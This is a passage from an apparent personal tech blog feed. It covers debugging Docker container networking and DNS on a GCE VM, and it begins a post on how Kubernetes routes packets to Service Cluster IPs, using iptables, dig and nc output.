</span><span class='line'>dxia@my-host:~$ sudo iptables --list INPUT --verbose --numeric --line-numbers --table filter
</span><span class='line'>Chain INPUT (policy DROP 0 packets, 0 bytes)
</span><span class='line'>num   pkts bytes target     prot opt in     out     source               destination
</span><span class='line'>1     434M  345G            all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 00 ACC-eth0 input */
</span><span class='line'>2        0     0            all  --  eth1   *       0.0.0.0/0            0.0.0.0/0            /* 00 ACC-eth1 input */
</span><span class='line'>3     7080  283K DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 000 drop invalid */ ctstate INVALID
</span><span class='line'>4    1908M  568G ipthrouput  all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 000 track forward */
</span><span class='line'>5     987M  414G ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 001 accept established */ ctstate RELATED,ESTABLISHED
</span><span class='line'>6     763M   95G ACCEPT     all  --  lo     *       0.0.0.0/0            0.0.0.0/0            /* 002 allow local */
</span><span class='line'>7        0     0 ACCEPT     all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 003 accept ipsec */ policy match dir in pol ipsec
</span><span class='line'>8        1    28 ACCEPT     icmp --  *      *       0.0.0.0/0            0.0.0.0/0            /* 004 allow icmp */ icmptype 8 limit: avg 10/sec burst 5
</span><span class='line'>9        0     0 DROP       icmp --  *      *       0.0.0.0/0            0.0.0.0/0            /* 005 drop icmp */
</span><span class='line'>10       0     0 DROP       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 9203 /* 006 block JMX on service net */
</span><span class='line'>11       0     0 REJECT     tcp  --  *      *       0.0.0.0/0            0.0.0.0/0            multiport dports 9203 /* 020 deny direct access to JMX port on helios nodes */ reject-with icmp-port-unreachable
</span><span class='line'>12       0     0 DROP       all  --  eth0   *       10.48.64.0/22        0.0.0.0/0            /* 08 drop traffic from osxenv 10.48.64.0/22 */
</span><span class='line'>13       0     0 DROP       all  --  eth0   *       10.97.16.0/21        0.0.0.0/0            /* 08 drop traffic from osxenv 10.97.16.0/21 */
</span><span class='line'>14       0     0 DROP       all  --  eth0   *       172.24.32.0/22       0.0.0.0/0            /* 08 drop traffic from windowsbuildagentsenv 172.24.32.0/22 */
</span><span class='line'>15       0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 08 prevent access from buildagent machines */ match-set buildagent src
</span><span class='line'>16       0     0 DROP       all  --  *      *       0.0.0.0/0            0.0.0.0/0            /* 08 prevent access from paymentbamboo machines */ match-set paymentbamboo src
</span><span class='line'>17   18168 1094K ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow service nets */ match-set service_nets src
</span><span class='line'>18     134  8496 ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow tech offices */ match-set tech_offices src
</span><span class='line'>19       0     0 ACCEPT     all  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 09 allow testenv */ match-set testenv src
</span><span class='line'>20       0     0 ACCEPT     all  --  eth0   *       130.211.0.0/22       0.0.0.0/0            /* 10 Google networks for 130.211.0.0/22 */
</span><span class='line'>21       0     0 ACCEPT     all  --  eth0   *       35.191.0.0/16        0.0.0.0/0            /* 10 Google networks for 35.191.0.0/16 */
</span><span class='line'>22       0     0 LOG        tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            /* 11 inbound eth0: */ limit: avg 3/min burst 5 LOG flags 0 level 4 prefix "input eth0: "
</span><span class='line'>23       0     0 LOG        tcp  --  eth1   *       0.0.0.0/0            0.0.0.0/0            /* 11 inbound eth1: */ limit: avg 3/min burst 5 LOG flags 0 level 4 prefix "input eth1: "
</span><span class='line'>24       0     0 ACCEPT     all  --  docker0 *       0.0.0.0/0            0.0.0.0/0            /* 20 allow all docker0 traffic */
</span><span class='line'>25    158M   59G ACCEPT     all  --  corp0 *       0.0.0.0/0            0.0.0.0/0            /* 20 allow all corp0 traffic */
</span><span class='line'>26       0     0 ACCEPT     tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 22 /* 500 allow ssh on service net */ ctstate NEW recent: SET name: DEFAULT side: source mask: 255.255.255.255
</span><span class='line'>27       0     0 DROP       tcp  --  eth0   *       0.0.0.0/0            0.0.0.0/0            multiport dports 22 /* 501 limit ssh on service net */ ctstate NEW recent: UPDATE seconds: 180 hit_count: 20 name: DEFAULT side: source mask: 255.255.255.255
</span><span class='line'>28       0     0 ACCEPT     all  --  br-8ce7e363e4f9 *       0.0.0.0/0            0.0.0.0/0</span></code></pre></td></tr></table></div></figure>


<p>I retried querying for accounts.google.com, and I got a DNS reply!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) dig @127.0.0.11 accounts.google.com
</span><span class='line'>
</span><span class='line'>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.11 accounts.google.com
</span><span class='line'>; (1 server found)
</span><span class='line'>;; global options: +cmd
</span><span class='line'>;; Got answer:
</span><span class='line'>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: REFUSED, id: 9592
</span><span class='line'>;; flags: qr rd ad; QUERY: 0, ANSWER: 0, AUTHORITY: 0, ADDITIONAL: 0
</span><span class='line'>;; WARNING: recursion requested but not available
</span><span class='line'>
</span><span class='line'>;; Query time: 0 msec
</span><span class='line'>;; SERVER: 127.0.0.11#53(127.0.0.11)
</span><span class='line'>;; WHEN: Tue Apr 27 00:07:13 UTC 2021
</span><span class='line'>;; MSG SIZE  rcvd: 12</span></code></pre></td></tr></table></div></figure>


<p>But&hellip; there&rsquo;s no A records? Docker daemon logs stated that the upstream local unbound DNS server
did not return any A records.</p>

<h2>Error #3: unbound refused to reply to DNS queries from a private IP range used by the Docker network we&rsquo;re using</h2>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Apr 27 00:07:13 my-host.corp.net dockerd[32659]: time="2021-04-27T00:07:13.864160829Z" level=debug msg="Name To resolve: accounts.google.com."
</span><span class='line'>Apr 27 00:07:13 my-host.corp.net dockerd[32659]: time="2021-04-27T00:07:13.864325564Z" level=debug msg="[resolver] query accounts.google.com. (A) from 172.20.0.127:57576, forwarding to udp:10.99.0.1"
</span><span class='line'>Apr 27 00:07:13 my-host.corp.net dockerd[32659]: time="2021-04-27T00:07:13.864537556Z" level=debug msg="[resolver] external DNS udp:10.99.0.1 did not return any A records for \"accounts.google.com.\""</span></code></pre></td></tr></table></div></figure>


<p>Hm, I noticed the status in the empty DNS reply is <code>REFUSED</code>. I recalled that <a href="https://linux.die.net/man/5/unbound.conf">unbound supports
configuring which DNS queries it will reply to based on originating interface and
IP</a>.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ grep access-control /etc/unbound/unbound.conf
</span><span class='line'>    access-control: 127.0.0.1 allow
</span><span class='line'>    access-control: 10.99.0.0/24 allow
</span><span class='line'>    access-control: 10.174.18.90 allow</span></code></pre></td></tr></table></div></figure>


<p>Bingo! There&rsquo;s no <code>access-control</code> entry that allowed DNS queries from 172.20.0.127. I added
<code>access-control: 172.16.0.0/12 allow</code> (since all of 172.16.0.0/12 is private IPv4 address space
according to <a href="https://tools.ietf.org/html/rfc1918">RFC-1918</a>) and reloaded unbound. Now it worked!</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>dxia@my-host:~$ sudo systemctl reload unbound
</span><span class='line'>dxia@my-host:~$ sudo nsenter -n -t $(docker inspect --format  bar) dig @127.0.0.11 accounts.google.com
</span><span class='line'>
</span><span class='line'>; &lt;&lt;&gt;&gt; DiG 9.11.3-1ubuntu1.14-Ubuntu &lt;&lt;&gt;&gt; @127.0.0.11 accounts.google.com
</span><span class='line'>; (1 server found)
</span><span class='line'>;; global options: +cmd
</span><span class='line'>;; Got answer:
</span><span class='line'>;; -&gt;&gt;HEADER&lt;&lt;- opcode: QUERY, status: NOERROR, id: 36432
</span><span class='line'>;; flags: qr rd ra; QUERY: 1, ANSWER: 1, AUTHORITY: 0, ADDITIONAL: 1
</span><span class='line'>
</span><span class='line'>;; OPT PSEUDOSECTION:
</span><span class='line'>; EDNS: version: 0, flags:; udp: 4096
</span><span class='line'>;; QUESTION SECTION:
</span><span class='line'>;accounts.google.com.     IN  A
</span><span class='line'>
</span><span class='line'>;; ANSWER SECTION:
</span><span class='line'>accounts.google.com.  143 IN  A   74.125.202.84
</span><span class='line'>
</span><span class='line'>;; Query time: 2 msec
</span><span class='line'>;; SERVER: 127.0.0.11#53(127.0.0.11)
</span><span class='line'>;; WHEN: Tue Apr 27 00:11:41 UTC 2021
</span><span class='line'>;; MSG SIZE  rcvd: 64</span></code></pre></td></tr></table></div></figure>


<p>Docker daemon logs showed the following.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>Apr 27 00:11:41 my-host.corp.net dockerd[32659]: time="2021-04-27T00:11:41.957934764Z" level=debug msg="Name To resolve: accounts.google.com."
</span><span class='line'>Apr 27 00:11:41 my-host.corp.net dockerd[32659]: time="2021-04-27T00:11:41.958087666Z" level=debug msg="[resolver] query accounts.google.com. (A) from 172.20.0.127:33346, forwarding to udp:10.99.0.1"
</span><span class='line'>Apr 27 00:11:41 my-host.corp.net dockerd[32659]: time="2021-04-27T00:11:41.960007990Z" level=debug msg="[resolver] received A record \"74.125.202.84\" for \"accounts.google.com.\" from udp:10.99.0.1"</span></code></pre></td></tr></table></div></figure>


<h2>General Debugging Strategies and Techniques I Used</h2>

<p>Here are the general debugging strategies I used and reinforced for myself.</p>

<ul>
<li>When network requests fail, go down one layer on the stack to identify on exactly which layer it
fails. I.e. find out which protocol is responsible for the failure: HTTP, TCP, IP?</li>
<li>Try to reproduce the error by running the most direct and minimal command that simulates my actual
failure. In this case, an HTTP request made by <code>gcloud</code> was failing. I translated that into an <code>nc</code> command
that simulated the establishment of the TCP connection between containers. Or a DNS query from
bar was failing. I translated that into a <code>dig</code> command. And in all these cases, the origin of
these IP packets mattered. So knowing how to use <code>nsenter</code> to enter a network namespace and create
IP packets that originate from the same container was useful. <code>nsenter</code> is essential when debugging
containers that don&rsquo;t have any tools installed in them. The bar image only contains one
go-compiled executable. There&rsquo;s no other tools I can use in there.</li>
<li>I encountered three errors in this case. Tackle one error at a time, and don&rsquo;t give up.</li>
<li>Be scientific. Have a working hypothesis at each step for which you collect evidence that either
supports or refutes it.</li>
<li>If you get stuck, go back and question your previous assumptions or conclusions. Are there other
tests you can run that can confirm or disprove what you thought was true?</li>
</ul>


<h2>Patches</h2>

<p>Error #1: I created a patch that makes our Puppet installation ignore rules created by Docker
networks in the filter table&rsquo;s FORWARD chain.</p>

<p>Error #2: Unfortunately, I don&rsquo;t think there&rsquo;s a good solution to this other than disabling our
GCE VM&rsquo;s periodic Puppet runs and manually adding a rule to allow packets from the new interface.
The chain&rsquo;s default policy is <code>DROP</code>, and interface names are dynamic.</p>

<p>Error #3: I made a patch that makes unbound reply to DNS queries with source IPs of in the range
<code>172.16.0.0/12</code>.</p>
]]></content>
  </entry>
  
  <entry>
    <title type="html"><![CDATA[How Kubernetes Routes IP Packets to Services' Cluster IPs]]></title>
    <link href="https://www.davidxia.com/2021/01/how-kubernetes-routes-ip-packets-to-services-cluster-ips/"/>
    <updated>2021-01-27T13:22:02-05:00</updated>
    <id>https://www.davidxia.com/2021/01/how-kubernetes-routes-ip-packets-to-services-cluster-ips</id>
    <content type="html"><![CDATA[<p>I recently observed DNS resolution errors on a large Kubernetes (K8s) cluster. This behavior was
only happening on 0.1% of K8s nodes. But the fact that this behavior wasn&rsquo;t self-healing and
crippled tenant workloads in addition to my penchant to chase rabbits down holes meant I
wasn&rsquo;t going to let it go. I emerged learning how K8s Services&#8217; Cluster IP feature actually works.
Explaining this feature and my particular problem and speculative fix is the goal of this post.</p>

<h2>The Problem</h2>

<p>The large K8s cluster is actually a Google Kubernetes Engine (GKE) cluster with master version
1.17.14-gke.400 and node version 1.17.13-gke.2600. This is a multi-tenant cluster with hundreds of
nodes. Each node runs dozens of user workloads. Some users said DNS resolution within their Pods on
certain nodes weren&rsquo;t working. I was able to reproduce this behavior with the following steps.</p>

<p>Kubernetes schedules <code>kube-dns</code> Pods and a Service on the cluster that provide DNS and configures
kubelets to tell individual containers to use the DNS Service&rsquo;s IP to resolve DNS names. <a href="https://kubernetes.io/docs/concepts/services-networking/dns-pod-service/">See K8s
docs here</a>. First I get the <code>kube-dns</code>&lsquo; Service&rsquo;s Cluster IP. This is the IP address to
which DNS queries from Pods are sent.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
</pre></td><td class='code'><pre><code class=''><span class='line'>kubectl --context my-gke-cluster -n kube-system get services kube-dns
</span><span class='line'>NAME       TYPE        CLUSTER-IP     EXTERNAL-IP   PORT(S)         AGE
</span><span class='line'>kube-dns   ClusterIP   10.178.64.10   &lt;none&gt;        53/UDP,53/TCP   666d</span></code></pre></td></tr></table></div></figure>


<p>Then I make DNS queries against the Cluster IP from a Pod running on a broken node.</p>

<!-- more -->




<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Log into the GKE node
</span><span class='line'>gcloud --project my-project compute ssh my-gke-node --zone us-central1-b --internal-ip
</span><span class='line'>
</span><span class='line'># Need to run toolbox container which has iptables command. Google's Container-Optimized OS doesn't
</span><span class='line'># have it.
</span><span class='line'>dxia@my-gke-node ~ $ toolbox
</span><span class='line'>20200603-00: Pulling from google-containers/toolbox
</span><span class='line'>Digest: sha256:36e2f6b8aa40328453aed7917860a8dee746c101dfde4464ce173ed402c1ec57
</span><span class='line'>Status: Image is up to date for gcr.io/google-containers/toolbox:20200603-00
</span><span class='line'>gcr.io/google-containers/toolbox:20200603-00
</span><span class='line'>e6b1ee70f91ac405623cbf1d2afa9a532a022dc644bddddd754d2cd786f58273
</span><span class='line'>
</span><span class='line'>dxia-gcr.io_google-containers_toolbox-20200603-00
</span><span class='line'>Please do not use --share-system anymore, use $SYSTEMD_NSPAWN_SHARE_* instead.
</span><span class='line'>Spawning container dxia-gcr.io_google-containers_toolbox-20200603-00 on /var/lib/toolbox/dxia-gcr.io_google-containers_toolbox-20200603-00.
</span><span class='line'>Press ^] three times within 1s to kill container.
</span><span class='line'>
</span><span class='line'># Install dig
</span><span class='line'>root@toolbox:~# apt-get update && apt-get install dnsutils
</span><span class='line'>
</span><span class='line'># Ask the kube-dns Cluster IP to resolve www.google.com
</span><span class='line'># dig will hang when it's waiting on a DNS reply. So ^C's show DNS resolution failures
</span><span class='line'>root@toolbox:~# for x in $(seq 1 20); do echo ${x}; dig @10.178.64.10 www.google.com &gt; /dev/null; done
</span><span class='line'>1
</span><span class='line'>^C2
</span><span class='line'>^C3
</span><span class='line'>4
</span><span class='line'>5
</span><span class='line'>6
</span><span class='line'>7
</span><span class='line'>8
</span><span class='line'>^C9
</span><span class='line'>10
</span><span class='line'>11
</span><span class='line'>12
</span><span class='line'>13
</span><span class='line'>14
</span><span class='line'>15
</span><span class='line'>^C16
</span><span class='line'>17
</span><span class='line'>18
</span><span class='line'>^C19
</span><span class='line'>20</span></code></pre></td></tr></table></div></figure>


<p>I cordoned and drained the node and added the annotation
<code>cluster-autoscaler.kubernetes.io/scale-down-disabled=true</code> to <a href="https://github.com/kubernetes/autoscaler/blob/b470c62bfa6269ed185d21d47dadc339353deb68/cluster-autoscaler/FAQ.md#how-can-i-prevent-cluster-autoscaler-from-scaling-down-a-particular-node">prevent the cluster autoscaler from
deleting it</a>.</p>

<p>Then I performed a more basic test. I tested whether I could even make a TCP connection to the
Cluster IP on port 53 (default DNS port).</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># Run nc 1000 times without reverse DNS lookup, in verbose and scan mode
</span><span class='line'># Count only failed connections
</span><span class='line'>root@toolbox:~# for x in $(seq 1 1000); do nc 10.178.64.10 53 -nvz 2&gt;&1 | grep -v open; done | wc -l
</span><span class='line'>257</span></code></pre></td></tr></table></div></figure>


<p>A quarter of the TCP connections fail. This means the error is below the DNS layer at TCP layer 3.</p>

<h2>Finding the Root Cause: Down the Rabbit Hole</h2>

<p>Some background for those unfamiliar. K8s nodes (via the <code>kube-proxy</code> DaemonSet) will route IP
packets originating from a Pod with a destination of a K8s Service&rsquo;s Cluster IP to a backing Pod IP
in <a href="https://kubernetes.io/docs/concepts/services-networking/service/#virtual-ips-and-service-proxies">one of three proxy modes</a>: user space, iptables, and IPVS. I&rsquo;m assuming GKE
runs <code>kube-proxy</code> in iptables proxy mode since <a href="https://cloud.google.com/kubernetes-engine/docs/concepts/network-overview#kube-proxy">iptables instead of IPVS is mentioned in their docs
here</a>.</p>

<p><code>kube-proxy</code> should keep the node&rsquo;s iptable rules up to date with the actual <code>kube-dns</code>
Service&rsquo;s endpoints. The following console output shows how I figured out the IP packet flow by
tracing matching iptables rules.</p>

<figure class='code'><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
<span class='line-number'>69</span>
<span class='line-number'>70</span>
<span class='line-number'>71</span>
<span class='line-number'>72</span>
<span class='line-number'>73</span>
<span class='line-number'>74</span>
<span class='line-number'>75</span>
<span class='line-number'>76</span>
<span class='line-number'>77</span>
<span class='line-number'>78</span>
<span class='line-number'>79</span>
<span class='line-number'>80</span>
<span class='line-number'>81</span>
<span class='line-number'>82</span>
<span class='line-number'>83</span>
<span class='line-number'>84</span>
<span class='line-number'>85</span>
<span class='line-number'>86</span>
<span class='line-number'>87</span>
<span class='line-number'>88</span>
<span class='line-number'>89</span>
<span class='line-number'>90</span>
<span class='line-number'>91</span>
<span class='line-number'>92</span>
<span class='line-number'>93</span>
<span class='line-number'>94</span>
<span class='line-number'>95</span>
<span class='line-number'>96</span>
<span class='line-number'>97</span>
<span class='line-number'>98</span>
<span class='line-number'>99</span>
<span class='line-number'>100</span>
<span class='line-number'>101</span>
<span class='line-number'>102</span>
<span class='line-number'>103</span>
<span class='line-number'>104</span>
<span class='line-number'>105</span>
</pre></td><td class='code'><pre><code class=''><span class='line'># List rules in FORWARD chain's filter table
</span><span class='line'>root@toolbox:~# iptables -L FORWARD -t filter
</span><span class='line'>Chain FORWARD (policy DROP)
</span><span class='line'>target     prot opt source               destination
</span><span class='line'>cali-FORWARD  all  --  anywhere             anywhere             /* cali:wUHhoiAYhphO9Mso */
</span><span class='line'>KUBE-FORWARD  all  --  anywhere             anywhere             /* kubernetes forwarding rules */
</span><span class='line'>KUBE-SERVICES  all  --  anywhere             anywhere             ctstate NEW /* kubernetes service portals */
</span><span class='line'>DOCKER-USER  all  --  anywhere             anywhere
</span><span class='line'>DOCKER-ISOLATION-STAGE-1  all  --  anywhere             anywhere
</span><span class='line'>ACCEPT     all  --  anywhere             anywhere             ctstate RELATED,ESTABLISHED
</span><span class='line'>DOCKER     all  --  anywhere             anywhere
</span><span class='line'>ACCEPT     all  --  anywhere             anywhere
</span><span class='line'>ACCEPT     all  --  anywhere             anywhere
</span><span class='line'>ACCEPT     tcp  --  anywhere             anywhere
</span><span class='line'>ACCEPT     udp  --  anywhere             anywhere
</span><span class='line'>ACCEPT     icmp --  anywhere             anywhere
</span><span class='line'>ACCEPT     sctp --  anywhere             anywhere
</span><span class='line'>
</span><span class='line'># List rules in KUBE-SERVICES chain's nat table and look for rules that forward IP packets destined
</span><span class='line'># for the K8s Service kube-system/kube-dns' Cluster IP
</span><span class='line'>root@toolbox:~# iptables -L KUBE-SERVICES -t nat | grep kube-system/kube-dns | grep SVC
</span><span class='line'>KUBE-SVC-ERIFXISQEP7F7OF4  tcp  --  anywhere             10.178.64.10         /* kube-system/kube-dns:dns-tcp cluster IP */ tcp dpt:domain
</span><span class='line'>KUBE-SVC-TCOU7JCQXEZGVUNU  udp  --  anywhere             10.178.64.10         /* kube-system/kube-dns:dns cluster IP */ udp dpt:domain
</span><span class='line'>
</span><span class='line'># List rules in KUBE-SVC-ERIFXISQEP7F7OF4 chain's nat table
</span><span class='line'>Chain KUBE-SVC-ERIFXISQEP7F7OF4 (1 references)
</span><span class='line'>target     prot opt source               destination
</span><span class='line'>KUBE-SEP-BMNCBK7ROA3MA6UU  all  --  anywhere             anywhere             statistic mode random probability 0.01538461540
</span><span class='line'>KUBE-SEP-GYUBQUCI6VR6AER2  all  --  anywhere             anywhere             statistic mode random probability 0.01562500000
</span><span class='line'>KUBE-SEP-IF56RUVXN2P4ORZZ  all  --  anywhere             anywhere             statistic mode random probability 0.01587301586
</span><span class='line'>KUBE-SEP-WUD7OE7TYMWFJJYX  all  --  anywhere             anywhere             statistic mode random probability 0.01612903224
</span><span class='line'>KUBE-SEP-B7IYZJB6QVUX246S  all  --  anywhere             anywhere             statistic mode random probability 0.01639344264
</span><span class='line'>KUBE-SEP-T6B7SPNOX3DH33BE  all  --  anywhere             anywhere             statistic mode random probability 0.01666666660
</span><span class='line'>KUBE-SEP-REJSUT2VC76HMIRQ  all  --  anywhere             anywhere             statistic mode random probability 0.01694915257
</span><span class='line'>KUBE-SEP-B4N4VXNUSBNXHV73  all  --  anywhere             anywhere             statistic mode random probability 0.01724137925
</span><span class='line'>KUBE-SEP-XUJIW6IGZX4X5BBG  all  --  anywhere             anywhere             statistic mode random probability 0.01754385978
</span><span class='line'>KUBE-SEP-MMBQBWR6AYIPMUZL  all  --  anywhere             anywhere             statistic mode random probability 0.01785714272
</span><span class='line'>KUBE-SEP-6O5U6FAKQVEXGTP7  all  --  anywhere             anywhere             statistic mode random probability 0.01818181807
</span><span class='line'>KUBE-SEP-DMN3RJWMPAEHNOGE  all  --  anywhere             anywhere             statistic mode random probability 0.01851851866
</span><span class='line'>KUBE-SEP-FHJKZIH3JDZSXJUD  all  --  anywhere             anywhere             statistic mode random probability 0.01886792434
</span><span class='line'>KUBE-SEP-YRPM7BEQS2YESSJL  all  --  anywhere             anywhere             statistic mode random probability 0.01923076902
</span><span class='line'>KUBE-SEP-BSHQZGGNYIILL3V7  all  --  anywhere             anywhere             statistic mode random probability 0.01960784290
</span><span class='line'>KUBE-SEP-XTW5FCAH2423EWAV  all  --  anywhere             anywhere             statistic mode random probability 0.02000000002
</span><span class='line'>KUBE-SEP-2ETTGYCM3KLKL54Q  all  --  anywhere             anywhere             statistic mode random probability 0.02040816331
</span><span class='line'>KUBE-SEP-ZUFFQWVT2EY73YVF  all  --  anywhere             anywhere             statistic mode random probability 0.02083333349
</span><span class='line'>KUBE-SEP-VUNSBD5OILT2BGUX  all  --  anywhere             anywhere             statistic mode random probability 0.02127659554
</span><span class='line'>KUBE-SEP-3XVS5OF4SBBHATZW  all  --  anywhere             anywhere             statistic mode random probability 0.02173913037
</span><span class='line'>KUBE-SEP-IRW2YX5BEMBR3OGF  all  --  anywhere             anywhere             statistic mode random probability 0.02222222229
</span><span class='line'>KUBE-SEP-6J6T3TOCBEQ5NUQ5  all  --  anywhere             anywhere             statistic mode random probability 0.02272727247
</span><span class='line'>KUBE-SEP-E3FOMPW5DQK5FDIA  all  --  anywhere             anywhere             statistic mode random probability 0.02325581387
</span><span class='line'>KUBE-SEP-EO4O2TBNDPU377YQ  all  --  anywhere             anywhere             statistic mode random probability 0.02380952379
</span><span class='line'>KUBE-SEP-ZGRZOBXXZ2KPGNZD  all  --  anywhere             anywhere             statistic mode random probability 0.02439024393
</span><span class='line'>KUBE-SEP-XLRCUOCE6XAL3TYE  all  --  anywhere             anywhere             statistic mode random probability 0.02499999991
</span><span class='line'>KUBE-SEP-477YCBVB2RZ4WKUD  all  --  anywhere             anywhere             statistic mode random probability 0.02564102551
</span><span class='line'>KUBE-SEP-FGVS22Q3OCM6S5VS  all  --  anywhere             anywhere             statistic mode random probability 0.02631578967
</span><span class='line'>KUBE-SEP-FBHD55TKQKCEKSUO  all  --  anywhere             anywhere             statistic mode random probability 0.02702702722
</span><span class='line'>KUBE-SEP-ULRGL5A7XKWV3HB6  all  --  anywhere             anywhere             statistic mode random probability 0.02777777798
</span><span class='line'>KUBE-SEP-HO6T2NOJNNMVWDPW  all  --  anywhere             anywhere             statistic mode random probability 0.02857142873
</span><span class='line'>KUBE-SEP-PV23DIU55F5LDJIX  all  --  anywhere             anywhere             statistic mode random probability 0.02941176482
</span><span class='line'>KUBE-SEP-6PL2LOTBN64MN2IF  all  --  anywhere             anywhere             statistic mode random probability 0.03030303027
</span><span class='line'>KUBE-SEP-3G3LTNLLVZWE57GZ  all  --  anywhere             anywhere             statistic mode random probability 0.03125000000
</span><span class='line'>KUBE-SEP-SNHFF6VK2KP44I7Q  all  --  anywhere             anywhere             statistic mode random probability 0.03225806449
